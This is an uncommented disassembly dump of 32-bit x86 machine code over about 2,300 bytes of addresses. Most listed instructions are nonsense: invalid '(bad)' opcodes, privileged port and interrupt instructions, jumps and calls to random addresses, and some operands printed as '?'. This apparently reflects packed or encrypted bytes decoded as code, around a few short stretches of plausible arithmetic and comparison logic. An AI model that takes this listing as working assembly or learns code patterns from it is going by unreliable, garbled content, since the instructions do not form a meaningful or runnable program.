  41416e:	in     eax,0xb
  414170:	jns    0x41417e
  414172:	mov    ds,WORD PTR [edx+edi*1-0x1f]
  414176:	xor    ebp,0xffffff98
  414179:	push   ecx
  41417a:	inc    ebp
  41417b:	pop    es
  41417c:	push   ds
  41417d:	aas    
  41417e:	cmc    
  41417f:	fcom   DWORD PTR [edi+0x331eff06]
  414185:	inc    ebx
  414186:	bound  esi,QWORD PTR [edx+0x17]
  414189:	push   ds
  41418a:	mov    cl,0xcd
  41418c:	push   esp
  41418d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41418e:	iret   
  41418f:	pusha  
  414190:	daa    
  414191:	jnp    0x414167
  414193:	div    BYTE PTR [ebx+0x44]
  414196:	shl    DWORD PTR [eax-0x3e],0x6e
  41419a:	add    BYTE PTR [ebx+0x55],0xe5
  41419e:	jne    0x4141b8
  4141a0:	(bad)  
  4141a1:	adc    eax,0x885428b2
  4141a6:	arpl   sp,si
  4141a8:	mov    dl,0xb8
  4141aa:	adc    DWORD PTR [edx-0x13],esi
  4141ad:	mov    ebx,0x4d8e6f2e
  4141b2:	mov    dh,0x2a
  4141b4:	je     0x41417b
  4141b6:	sbb    BYTE PTR [edi-0x6],dh
  4141b9:	fistp  DWORD PTR [ebp+0x2d]
  4141bc:	cld    
  4141bd:	dec    ecx
  4141be:	daa    
  4141bf:	cwde   
  4141c0:	pop    edi
  4141c1:	sar    al,1
  4141c3:	mov    bh,BYTE PTR [eax]
  4141c5:	pop    esi
  4141c6:	or     DWORD PTR [esi+0x5a],esi
  4141c9:	mov    ds,WORD PTR [esi]
  4141cb:	cwde   
  4141cc:	add    DWORD PTR [ebp+0x2fa83776],eax
  4141d2:	jb     0x4141b3
  4141d4:	sbb    BYTE PTR [esi],dl
  4141d6:	mov    ebx,0x5939e214
  4141db:	push   es
  4141dc:	(bad)  
  4141dd:	mov    esi,0xabbd9eac
  4141e2:	xor    al,0x7c
  4141e4:	and    BYTE PTR [ebp+0x227461a6],dl
  4141ea:	mov    DWORD PTR [ebx-0x50],esi
  4141ed:	jge    0x414199
  4141ef:	jmp    0xac193e40
  4141f4:	ret    0xecf7
  4141f7:	jae    0x4141b7
  4141f9:	ror    DWORD PTR [edi+eax*1],0x6b
  4141fd:	shl    BYTE PTR [ebx+0x60f5c7fa],0xe0
  414204:	and    eax,0xf2dd99a4
  414209:	and    bh,BYTE PTR fs:[edx*4+0x9f3941]
  414211:	and    al,0x97
  414213:	addr16 popa 
  414215:	xor    eax,0x2435cca3
  41421a:	mov    bl,0xf3
  41421c:	pop    edi
  41421d:	mov    eax,ds:0x7e017bbd
  414222:	repz (bad) 
  414224:	jmp    0xb5ba78ae
  414229:	sub    DWORD PTR [edi+0x5ed1f405],esp
  41422f:	repnz cdq 
  414231:	adc    BYTE PTR [ebx-0xa],dh
  414234:	sar    BYTE PTR [ebp+0x38],0x1
  414238:	xor    cl,cl
  41423a:	loope  0x414257
  41423c:	je     0x4142a9
  41423e:	jle    0x414247
  414240:	push   esp
  414241:	test   DWORD PTR [edx-0x2dbd2c62],edx
  414247:	popf   
  414248:	inc    ecx
  414249:	xor    eax,0x61f510e3
  41424e:	mov    al,ds:0xda19035a
  414253:	and    edi,DWORD PTR [edi]
  414255:	test   al,0xe0
  414257:	mov    bh,0xc8
  414259:	loop   0x4142a9
  41425b:	pop    ds
  41425c:	jge    0x414246
  41425e:	adc    bl,BYTE PTR [edi-0x2e]
  414261:	push   cs
  414262:	repnz aaa 
  414264:	push   ss
  414265:	inc    ebp
  414266:	mov    cl,0xe0
  414268:	aad    0xa3
  41426a:	add    eax,0xc3911451
  41426f:	call   0x86f79d93
  414274:	inc    edx
  414275:	push   ebp
  414276:	inc    ecx
  414277:	mov    WORD PTR [ebx+0x43],?
  41427a:	fwait
  41427b:	ja     0x4142cc
  41427d:	imul   esp,DWORD PTR [edi-0x57628eec],0xffffff8c
  414284:	inc    esp
  414285:	dec    esp
  414286:	mov    bh,BYTE PTR ds:0x28f325cb
  41428c:	dec    esp
  41428d:	fbstp  TBYTE PTR [edx]
  41428f:	cmc    
  414290:	cmc    
  414291:	sahf   
  414292:	or     eax,0xf9dde4d
  414297:	dec    esp
  414298:	dec    edi
  414299:	pusha  
  41429a:	ficomp WORD PTR [esi]
  41429c:	push   ebx
  41429d:	xor    eax,0xa0251fd6
  4142a2:	pop    edx
  4142a3:	out    0xdf,eax
  4142a5:	mov    esp,0xe3c77c98
  4142aa:	xchg   ebp,eax
  4142ab:	pop    ecx
  4142ac:	or     al,BYTE PTR [edi]
  4142ae:	je     0x4142b5
  4142b0:	inc    ecx
  4142b1:	mov    ah,BYTE PTR [ebp+0x714d01d8]
  4142b7:	jmp    0x156a762c
  4142bc:	jbe    0x4142a8
  4142be:	mov    dh,BYTE PTR [edx]
  4142c0:	outs   dx,DWORD PTR ds:[esi]
  4142c1:	call   0x15ef:0x87b43c94
  4142c8:	scas   al,BYTE PTR es:[edi]
  4142c9:	xor    eax,0x5ea9e138
  4142ce:	mov    bh,0xc7
  4142d0:	lods   eax,DWORD PTR ds:[esi]
  4142d1:	cmp    al,0x6b
  4142d3:	push   esi
  4142d4:	mov    ds,WORD PTR [esi+ebp*2-0x792b1989]
  4142db:	xor    BYTE PTR [eax+ebx*4-0x512b223c],0x70
  4142e3:	call   DWORD PTR [edx-0x49]
  4142e6:	jl     0x414285
  4142e8:	mov    ah,0x8b
  4142ea:	aas    
  4142eb:	sbb    eax,0x52dd3eb2
  4142f0:	test   DWORD PTR [esi],edi
  4142f2:	inc    edx
  4142f3:	xor    eax,DWORD PTR [eax+0x75]
  4142f6:	jbe    0x4142d9
  4142f8:	sbb    dl,BYTE PTR [edi+edx*1-0x7008773e]
  4142ff:	add    ch,bl
  414301:	push   ecx
  414302:	mov    ds:0x771fc9ca,al
  414307:	int3   
  414308:	call   0xcd20:0x3ed44e7
  41430f:	adc    ah,BYTE PTR [edi+edx*2+0x4727d929]
  414316:	ja     0x4142e8
  414318:	xchg   ebp,eax
  414319:	pusha  
  41431a:	aad    0x8e
  41431c:	retf   
  41431d:	sub    BYTE PTR [esi-0x47],0xc3
  414321:	(bad)  
  414322:	jne    0x4142c7
  414324:	pop    ecx
  414325:	shl    BYTE PTR [edx-0x20],1
  414328:	aam    0x19
  41432a:	jae    0x4143ab
  41432c:	push   ecx
  41432d:	lods   eax,DWORD PTR ds:[esi]
  41432e:	mov    ebx,0xcbf07ae9
  414333:	shl    DWORD PTR [ebx+ecx*1-0x6f],1
  414337:	push   ecx
  414338:	and    DWORD PTR [ecx],ebx
  41433a:	mov    ebp,ds
  41433c:	fdivr  DWORD PTR [esi]
  41433e:	push   0xffffff92
  414340:	inc    ebx
  414341:	push   edi
  414342:	pop    ebp
  414343:	dec    ebx
  414344:	ret    0x2e44
  414347:	aad    0xd4
  414349:	loope  0x41438d
  41434b:	ror    BYTE PTR [ebp-0x23a947f4],0xf7
  414352:	inc    ebp
  414353:	mov    ds:0xb4a3c59a,eax
  414358:	cs mov dl,ch
  41435b:	mov    cl,0xc5
  41435d:	and    dx,WORD PTR [ebx+eax*2-0x1a0d0c37]
  414365:	sbb    eax,0x1d2ab781
  41436a:	dec    ebx
  41436b:	lods   al,BYTE PTR ds:[esi]
  41436c:	int    0x29
  41436e:	inc    esp
  41436f:	cdq    
  414370:	fcmovne st,st(2)
  414372:	les    edx,FWORD PTR [esi]
  414374:	in     al,0x28
  414376:	xchg   edi,eax
  414377:	inc    ecx
  414378:	sub    edi,DWORD PTR [ebp-0x1f8bbf6a]
  41437e:	call   0x7fe8:0x6c5ba701
  414385:	sub    dl,al
  414387:	pop    es
  414388:	loope  0x414379
  41438a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41438b:	ja     0x414384
  41438d:	(bad)  
  41438e:	(bad)  
  41438f:	mov    bh,0x82
  414391:	mov    esp,0x16e601ca
  414396:	add    eax,0xd0313ac1
  41439b:	in     eax,0x32
  41439d:	loope  0x4143d0
  41439f:	ret    0x74fe
  4143a2:	sub    BYTE PTR [edi],al
  4143a4:	and    edx,DWORD PTR [eax+0x72]
  4143a7:	ins    DWORD PTR es:[edi],dx
  4143a8:	sbb    BYTE PTR [edi-0x1b],ch
  4143ab:	popf   
  4143ac:	xor    eax,0x9aaacd59
  4143b1:	mov    ebp,0x418fe688
  4143b6:	sub    ch,0x60
  4143b9:	mov    WORD PTR [edx+0x72],ss
  4143bc:	jecxz  0x4143c2
  4143be:	jae    0x41438c
  4143c0:	mov    ?,WORD PTR [eax+edi*4+0x78502284]
  4143c7:	push   ecx
  4143c8:	lods   al,BYTE PTR ds:[esi]
  4143c9:	inc    esp
  4143ca:	clc    
  4143cb:	cmp    BYTE PTR [edx],dl
  4143cd:	mov    ch,0x41
  4143cf:	or     eax,0x59fe40b6
  4143d4:	cmp    edi,DWORD PTR [esi-0x1b]
  4143d7:	call   0x2b2cb315
  4143dc:	in     al,dx
  4143dd:	mov    eax,ds:0xeb7945dd
  4143e2:	pop    eax
  4143e3:	jb     0x4143f6
  4143e5:	mov    al,0xf6
  4143e7:	cld    
  4143e8:	jnp    0x414419
  4143ea:	push   es
  4143eb:	xor    eax,0xa6ed88ba
  4143f0:	fcomp  st(7)
  4143f2:	ret    0xae85
  4143f5:	xchg   BYTE PTR [esi-0x28b57f6c],cl
  4143fb:	pop    ds
  4143fc:	push   edi
  4143fd:	mov    DWORD PTR [ebp+0xc695978],ebx
  414403:	push   ecx
  414404:	cmc    
  414405:	mov    esi,0x4b3dd32f
  41440a:	ins    BYTE PTR es:[edi],dx
  41440b:	stos   BYTE PTR es:[edi],al
  41440c:	mov    bh,0xb0
  41440e:	mov    al,0x31
  414410:	jns    0x414423
  414412:	aam    0x9b
  414414:	cmp    edi,ebx
  414416:	or     BYTE PTR [ebx-0x511b96af],0x5c
  41441d:	fcomp  QWORD PTR [edi+eiz*4+0x2282e11]
  414424:	pop    ss
  414425:	call   0xd25a37f1
  41442a:	push   ebx
  41442b:	inc    edi
  41442c:	xchg   ebp,eax
  41442d:	sub    eax,0xc659a539
  414432:	xchg   esp,eax
  414433:	xor    BYTE PTR [edi-0x70],bh
  414436:	loop   0x4143ce
  414438:	test   DWORD PTR [edi],edi
  41443a:	pop    ecx
  41443b:	or     esi,ebx
  41443d:	test   ecx,esp
  41443f:	jle    0x414497
  414441:	imul   ecx,DWORD PTR cs:[esi-0x1],0xffffffe5
  414446:	cwde   
  414447:	cli    
  414448:	je     0x414414
  41444a:	mov    ebx,0x40389504
  41444f:	jae    0x414405
  414451:	repnz int3 
  414453:	add    ch,BYTE PTR [ebx]
  414455:	adc    dh,BYTE PTR [ebx+0x1d]
  414458:	lds    ebx,FWORD PTR [eax-0x26c844cc]
  41445e:	and    DWORD PTR [edx+0x7e],0xc9bf91a0
  414465:	fdivrp st(1),st
  414467:	mov    bh,0x22
  414469:	(bad)  
  41446a:	(bad)  
  41446c:	sbb    DWORD PTR [esi-0x2793966c],esi
  414472:	inc    edi
  414473:	xchg   ebx,eax
  414474:	mov    ebx,0x1d0af5b9
  414479:	push   edx
  41447a:	inc    esp
  41447b:	or     dh,BYTE PTR [edx+0x59]
  41447e:	mov    ebp,0xf2ddd880
  414483:	in     al,0xc2
  414485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414486:	shr    BYTE PTR [edx],0xcd
  414489:	jg     0x41445d
  41448b:	outs   dx,DWORD PTR ds:[esi]
  41448c:	pop    esi
  41448d:	repnz adc edi,DWORD PTR [esi+ebp*2-0x13]
  414492:	jecxz  0x414431
  414494:	or     edi,DWORD PTR [esi-0x37b31a43]
  41449a:	xor    ah,BYTE PTR [ebx+0x76]
  41449d:	out    dx,al
  41449e:	or     al,0x19
  4144a0:	(bad)  
  4144a1:	lods   eax,DWORD PTR ds:[esi]
  4144a2:	mov    bl,0x57
  4144a4:	xlat   BYTE PTR ds:[ebx]
  4144a5:	test   al,0xbb
  4144a7:	mov    ebp,0x52204993
  4144ac:	push   es
  4144ad:	sbb    dl,cl
  4144af:	fcmovnu st,st(4)
  4144b1:	pop    es
  4144b2:	sub    al,0x43
  4144b4:	sbb    DWORD PTR [eax+0x70e7adf1],ebp
  4144ba:	mov    ecx,0x2e1d1a1d
  4144bf:	mov    edi,0xbde872c4
  4144c4:	in     eax,dx
  4144c5:	sub    al,0xf6
  4144c7:	inc    esp
  4144c8:	sbb    ah,BYTE PTR [ecx+0x43]
  4144cb:	pop    ss
  4144cc:	ror    BYTE PTR [ebp-0x1f],0xee
  4144d0:	and    eax,0x16de664b
  4144d5:	xchg   edx,eax
  4144d6:	cmp    eax,0xfdafd3c1
  4144db:	add    DWORD PTR [eax-0x28],ebp
  4144de:	push   ecx
  4144df:	push   edi
  4144e0:	push   ebp
  4144e1:	shl    BYTE PTR [edi],0x31
  4144e4:	out    dx,eax
  4144e5:	inc    esi
  4144e6:	std    
  4144e7:	push   ss
  4144e8:	dec    esi
  4144e9:	mov    eax,ds:0x3864f439
  4144ee:	sub    dl,BYTE PTR [esi+0x6c]
  4144f1:	mov    esi,0x50f97858
  4144f6:	rcl    DWORD PTR [edi],1
  4144f8:	push   0x8d1b7ead
  4144fd:	mov    DWORD PTR [ebx],ebp
  4144ff:	ds inc esi
  414501:	xor    edx,DWORD PTR [eax-0x13578976]
  414507:	out    0xdb,eax
  414509:	loop   0x41454e
  41450b:	mov    DWORD PTR [ebp-0x8],0x3204
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0x77c:0x73623c4c
  414595:	gs jae 0x414614
  414598:	shl    BYTE PTR [eax+ebx*1],cl
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    BYTE PTR [edi],al
  4145a1:	xor    BYTE PTR [ebx+0x5bf82ade],al
  4145a7:	clc    
  4145a8:	std    
  4145a9:	popa   
  4145aa:	out    0x46,al
  4145ac:	ret    
  4145ad:	repz sahf 
  4145af:	repnz sbb DWORD PTR [esp+edx*4],esp
  4145b3:	in     al,dx
  4145b4:	pusha  
  4145b5:	test   al,0xfb
  4145b7:	ret    0x4be6
  4145ba:	mov    eax,0x9a391b3e
  4145bf:	iret   
  4145c0:	adc    DWORD PTR [ebp+0x5e56b7d2],0x4a
  4145c7:	and    ch,BYTE PTR [edi-0x587b3f0b]
  4145cd:	nop
  4145ce:	mov    ebp,0xb99d997
  4145d3:	arpl   WORD PTR ds:0x8526613b,di
  4145d9:	test   ecx,edi
  4145db:	fidiv  DWORD PTR [esi-0x29d4ce22]
  4145e1:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4145e3:	sti    
  4145e4:	bound  esp,QWORD PTR [ebx+0x4f]
  4145e7:	adc    ch,ch
  4145e9:	and    ch,bl
  4145eb:	sub    al,0xc5
  4145ed:	add    ah,dh
  4145ef:	imul   edx,DWORD PTR [ecx-0x29],0xcbd91eb0
  4145f6:	and    DWORD PTR [esi+esi*1-0x3c],0x1690156d
  4145fe:	shl    ebx,cl
  414600:	jns    0x414647
  414602:	pop    edi
  414603:	cmp    BYTE PTR [eax-0x1d],0x1f
  414607:	cdq    
  414608:	cwde   
  414609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41460a:	jne    0x4145af
  41460c:	push   ebx
  41460d:	pushf  
  41460e:	daa    
  41460f:	pop    eax
  414610:	cmp    BYTE PTR [eax-0xa],0x3b
  414614:	rdtsc  
  414616:	popa   
  414617:	push   esp
  414618:	aaa    
  414619:	out    dx,eax
  41461a:	retf   0x50e9
  41461d:	or     cl,BYTE PTR [edx+0x3bcb7c42]
  414623:	sbb    BYTE PTR [edi],ah
  414625:	and    bl,BYTE PTR [esp+edx*8]
  414628:	js     0x414638
  41462a:	and    al,0x3b
  41462c:	dec    edi
  41462d:	test   eax,0x1bfaed51
  414632:	sti    
  414633:	sub    al,0xe7
  414635:	clc    
  414636:	ss push esi
  414638:	mov    cl,0x67
  41463a:	rcl    dl,0xac
  41463d:	xor    bl,ch
  41463f:	or     ecx,edx
  414641:	push   ecx
  414642:	cmp    ebx,esp
  414644:	jge    0x41461b
  414646:	xor    BYTE PTR [esi],dh
  414648:	xadd   bh,ah
  41464b:	pop    eax
  41464c:	fdivr  QWORD PTR [ebp+0x7a2e3869]
  414652:	adc    edx,DWORD PTR [edi-0x7b6e2597]
  414658:	mov    ebp,0x19e7bde
  41465d:	or     DWORD PTR ss:[eax+0x134a69f1],esi
  414664:	cdq    
  414665:	loopne 0x41463d
  414667:	mov    al,0x49
  414669:	into   
  41466a:	jmp    0x41465c
  41466c:	add    ecx,DWORD PTR [esi]
  41466e:	cld    
  41466f:	and    DWORD PTR [ecx+0x3c],ebx
  414672:	fnstcw WORD PTR [ebx]
  414674:	sub    esp,DWORD PTR [esi+0x54]
  414677:	rcl    BYTE PTR [ebx],1
  414679:	and    edi,DWORD PTR [eax+0xd]
  41467c:	mov    cl,0x8
  41467e:	test   eax,esi
  414680:	inc    ebx
  414681:	add    al,0x23
  414683:	data16 sbb al,0xe9
  414686:	in     eax,0x71
  414688:	xlat   BYTE PTR ds:[ebx]
  414689:	(bad)  
  41468a:	call   0x5047a868
  41468f:	lods   al,BYTE PTR ds:[esi]
  414690:	stos   DWORD PTR es:[edi],eax
  414691:	ja     0x4146bc
  414693:	cmp    al,0xeb
  414695:	or     al,0x7c
  414697:	scas   al,BYTE PTR es:[edi]
  414698:	icebp  
  414699:	or     eax,0xc4553ec2
  41469e:	cmc    
  41469f:	sbb    ch,ah
  4146a1:	xchg   esp,eax
  4146a2:	add    bh,dl
  4146a4:	jecxz  0x41462b
  4146a6:	push   esi
  4146a7:	fisub  DWORD PTR [ebx+0x4b]
  4146aa:	es pop ds
  4146ac:	mov    ah,0x53
  4146ae:	mov    ch,0xeb
  4146b0:	ins    BYTE PTR es:[edi],dx
  4146b1:	cmp    dl,dh
  4146b3:	mov    esp,0x3f3b4b73
  4146b8:	scas   eax,DWORD PTR es:[edi]
  4146b9:	popf   
  4146ba:	(bad)  
  4146bb:	test   eax,0x5858b815
  4146c0:	jae    0x4146b2
  4146c2:	push   esp
  4146c3:	mov    ch,0xac
  4146c5:	retf   
  4146c6:	pop    esi
  4146c7:	addr16 repz jb 0x414664
  4146cb:	daa    
  4146cc:	leave  
  4146cd:	test   BYTE PTR [esp+edx*8+0x36111713],0x10
  4146d5:	arpl   WORD PTR [esi],ax
  4146d7:	fst    st(6)
  4146d9:	sbb    BYTE PTR [ecx-0x4c19115e],dh
  4146df:	xor    al,0x52
  4146e2:	jns    0x414705
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	dec    ebp
  4146e6:	ret    0xeb08
  4146e9:	clc    
  4146ea:	cwde   
  4146eb:	shl    esp,0xc3
  4146ee:	xor    eax,edi
  4146f0:	mov    bh,al
  4146f2:	adc    eax,DWORD PTR [ecx+0x4a8159b]
  4146f8:	std    
  4146f9:	out    0xbe,eax
  4146fb:	fcom   QWORD PTR [edi-0x721623bc]
  414701:	sub    eax,0xbad186c6
  414706:	or     DWORD PTR [esi],ebp
  414708:	adc    al,0x20
  41470a:	or     ch,BYTE PTR [ebx*4+0x62879f4e]
  414711:	in     eax,dx
  414712:	out    dx,al
  414713:	jle    0x4146a3
  414715:	stos   BYTE PTR es:[edi],al
  414716:	mov    dh,0x43
  414718:	lds    ecx,FWORD PTR [ecx+ecx*1-0x55]
  41471c:	pop    edi
  41471d:	ja     0x4146e4
  41471f:	arpl   WORD PTR [edx-0x7f],sp
  414722:	and    al,ah
  414724:	sbb    edx,ecx
  414726:	out    0x9,al
  414728:	fisttp DWORD PTR ds:0x6040c153
  41472e:	loopne 0x4146ef
  414730:	fdivr  st,st(1)
  414732:	push   esp
  414733:	and    eax,0xc90c526c
  414738:	push   es
  414739:	int3   
  41473a:	jecxz  0x41478e
  41473c:	outs   dx,DWORD PTR ds:[esi]
  41473d:	inc    eax
  41473e:	xor    BYTE PTR [ebx-0x2a],0xc9
  414742:	(bad)
  414746:	loop   0x414716
  414748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414749:	stos   BYTE PTR es:[edi],al
  41474a:	outs   dx,WORD PTR ds:[esi]
  41474c:	outs   dx,BYTE PTR ds:[esi]
  41474d:	test   eax,0x50940b04
  414752:	loope  0x414728
  414754:	out    0x5b,al
  414756:	mov    ds:0xc9d1c9e6,al
  41475b:	fdivrp st(2),st
  41475d:	stc    
  41475e:	in     al,dx
  41475f:	nop
  414760:	or     al,0x39
  414762:	std    
  414763:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414765:	fcmovne st,st(5)
  414767:	xchg   BYTE PTR ds:0xad23045f,bh
  41476d:	and    cl,BYTE PTR [ecx]
  41476f:	aas    
  414770:	fdivr  DWORD PTR [ebx-0x19]
  414773:	add    eax,DWORD PTR [edx-0x636b226b]
  414779:	ins    DWORD PTR es:[edi],dx
  41477a:	(bad)  
  41477b:	nop
  41477c:	sbb    al,BYTE PTR [edx-0x3cc86614]
  414782:	adc    edx,DWORD PTR [edx+0x1fd33b49]
  414788:	test   al,0x51
  41478a:	aam    0xeb
  41478c:	retf   
  41478d:	out    0x44,eax
  41478f:	pop    es
  414790:	mov    bl,0x8d
  414792:	lahf   
  414793:	nop
  414794:	(bad)
  414798:	enter  0xd789,0xc5
  41479c:	imul   ecx,ebp,0x5f
  41479f:	nop
  4147a0:	in     al,0xdd
  4147a2:	stc    
  4147a3:	cmp    al,0x67
  4147a5:	cs call 0xd954aa84
  4147ab:	pop    esi
  4147ac:	jb     0x414733
  4147ae:	stos   DWORD PTR es:[edi],eax
  4147af:	or     eax,DWORD PTR [eax]
  4147b1:	stc    
  4147b2:	daa    
  4147b3:	in     al,dx
  4147b4:	fsub   QWORD PTR [edi-0x64]
  4147b7:	and    al,0xfb
  4147b9:	repz lahf 
  4147bb:	imul   DWORD PTR [ecx]
  4147bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147be:	ja     0x414743
  4147c0:	and    DWORD PTR [ebp-0x1a],0xc5c8be76
  4147c7:	js     0x4147b2
  4147c9:	(bad)  
  4147ca:	out    0x40,eax
  4147cc:	adc    bh,bh
  4147ce:	or     ecx,DWORD PTR [edi]
  4147d0:	xchg   ebx,eax
  4147d1:	loop   0x41481e
  4147d3:	push   ecx
  4147d4:	aaa    
  4147d5:	mov    ebx,0x125652ca
  4147da:	bound  edi,QWORD PTR ds:0x4a869532
  4147e0:	ins    DWORD PTR es:[edi],dx
  4147e1:	test   al,0x9a
  4147e3:	bound  edx,QWORD PTR [ecx]
  4147e5:	sbb    DWORD PTR [esi+0x50],ecx
  4147e8:	or     DWORD PTR [eax-0x356ed36f],esp
  4147ee:	cmp    al,0x6c
  4147f0:	pusha  
  4147f1:	add    cl,BYTE PTR [edx+eiz*2]
  4147f4:	out    0xf0,eax
  4147f6:	pop    edi
  4147f7:	jae    0x41485b
  4147f9:	sub    al,0xa8
  4147fb:	(bad)  
  4147fd:	jle    0x41478d
  4147ff:	push   esp
  414800:	pop    esp
  414801:	ds leave 
  414803:	into   
  414804:	sub    eax,0x41e084ba
  414809:	sbb    edi,DWORD PTR [esi-0x65]
  41480c:	fdiv   DWORD PTR [edi-0x11]
  414810:	in     al,0x89
  414812:	xlat   BYTE PTR ds:[ebx]
  414813:	stc    
  414814:	retf   
  414815:	add    al,0xcf
  414817:	inc    DWORD PTR [edx+0x3f1ae365]
  41481d:	imul   ebp,esp,0xafe2a6dd
  414823:	cld    
  414824:	pushf  
  414825:	or     eax,0xb6269faf
  41482a:	add    BYTE PTR [eax],al
  41482c:	add    al,0xd6
  41482e:	clc    
  41482f:	loope  0x4147b4
  414831:	popa   
  414832:	les    esp,FWORD PTR [esi-0x74]
  414835:	ret    
  414836:	scas   eax,DWORD PTR es:[edi]
  414837:	clc    
  414838:	pop    edx
  414839:	cmp    eax,0x32f8ea77
  41483e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41483f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414840:	loopne 0x41481c
  414842:	pusha  
  414843:	in     eax,0x80
  414845:	addr16 sub eax,0x8e66e8b5
  41484b:	ja     0x4147e8
  41484d:	cs mov bl,0x19
  414850:	mov    WORD PTR [esi-0x16932f9a],?
  414856:	bound  esp,QWORD PTR [esi+0x3d]
  414859:	retf   
  41485a:	push   ds
  41485b:	imul   esp,eax,0xffffffb0
  41485e:	push   0xddccdaf2
  414863:	sbb    BYTE PTR [esi+0x9],al
  414866:	mov    cl,0xa4
  414868:	sub    eax,0x641fbd3c
  41486d:	mov    bh,0x7d
  41486f:	outs   dx,DWORD PTR fs:[esi]
  414871:	pop    ecx
  414872:	in     eax,0xee
  414874:	sub    DWORD PTR [edx],ebx
  414876:	or     DWORD PTR [edx+0x1e],0x393f6044
  41487d:	mov    ah,0xeb
  41487f:	pop    ss
  414880:	jge    0x41486c
  414882:	clc    
  414883:	ret    0xc27b
  414886:	or     bl,dh
  414888:	and    dl,BYTE PTR [esp+ebp*2-0x2a]
  41488c:	and    BYTE PTR [edi],cl
  41488e:	rol    BYTE PTR [esi+eiz*2],0x72
  414892:	push   edx
  414893:	xchg   BYTE PTR [ebx+0x36d6920f],bl
  414899:	ins    DWORD PTR es:[edi],dx
  41489a:	or     DWORD PTR [ebp-0x59],edi
  41489d:	and    bl,BYTE PTR [edx]
  41489f:	lea    eax,[edx]
  4148a1:	sbb    esp,DWORD PTR [esi-0x61cd4a9]
  4148a7:	imul   edi,DWORD PTR [ecx+0x4c],0x61
  4148ab:	add    BYTE PTR [ebp-0x7a],dl
  4148ae:	jmp    0x7963:0x8213732a
  4148b5:	mov    ds:0x442a297f,eax
  4148ba:	ret    
  4148bb:	pop    ebx
  4148bc:	push   ds
  4148bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148be:	outs   dx,DWORD PTR ds:[esi]
  4148bf:	lods   al,BYTE PTR ds:[esi]
  4148c0:	ja     0x4148e8
  4148c2:	pop    ds
  4148c3:	arpl   WORD PTR [ebx+ebx*4],di
  4148c6:	pop    ebp
  4148c7:	push   esp
  4148c8:	pop    eax
  4148c9:	ds mov esp,0xc5151a18
  4148cf:	emms   
  4148d1:	mov    dh,0x9a
  4148d3:	ret    0x5a81
  4148d6:	repnz sbb bh,ah
  4148d9:	jle    0x414930
  4148db:	and    BYTE PTR ds:0x985aa375,0xb9
  4148e2:	jp     0x414950
  4148e4:	imul   edx,DWORD PTR [esi],0xffffff98
  4148e7:	xchg   edx,eax
  4148e8:	inc    esi
  4148e9:	std    
  4148ea:	mov    ecx,0x529c9db2
  4148ef:	xor    BYTE PTR [esi-0x7c],ch
  4148f2:	sub    DWORD PTR [eax-0x16b43199],ebp
  4148f8:	mov    bl,0x2e
  4148fa:	cmp    ecx,DWORD PTR [ecx+0x501c0f5d]
  414900:	(bad)  
  414901:	dec    edx
  414902:	jnp    0x4148cb
  414904:	in     al,dx
  414905:	cld    
  414906:	aaa    
  414907:	dec    eax
  414908:	bound  ecx,QWORD PTR [ecx+0x10ac44c9]
  41490e:	sahf   
  41490f:	out    0xf5,al
  414911:	mov    ah,0xf8
  414913:	test   eax,0xcaff765e
  414918:	mov    edx,0x75ca307f
  41491d:	jnp    0x414973
  41491f:	pop    ss
  414920:	push   ds
  414921:	leave  
  414922:	push   cs
  414923:	xchg   esi,eax
  414924:	sti    
  414925:	rcl    ebp,1
  414927:	cmc    
  414928:	mov    cl,0xae
  41492a:	push   ss
  41492b:	test   BYTE PTR [edi+0x5eb7f208],0xd7
  414932:	lods   al,BYTE PTR ds:[esi]
  414933:	pop    ds
  414934:	js     0x4148fb
  414936:	aas    
  414937:	lea    ecx,[esi]
  414939:	adc    al,0xbc
  41493b:	dec    edi
  41493c:	inc    ecx
  41493d:	into   
  41493e:	test   dh,0x36
  414941:	push   esp
  414942:	xchg   edi,eax
  414943:	and    eax,0x33209b7
  414948:	mov    ecx,DWORD PTR [ebp-0x4]
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
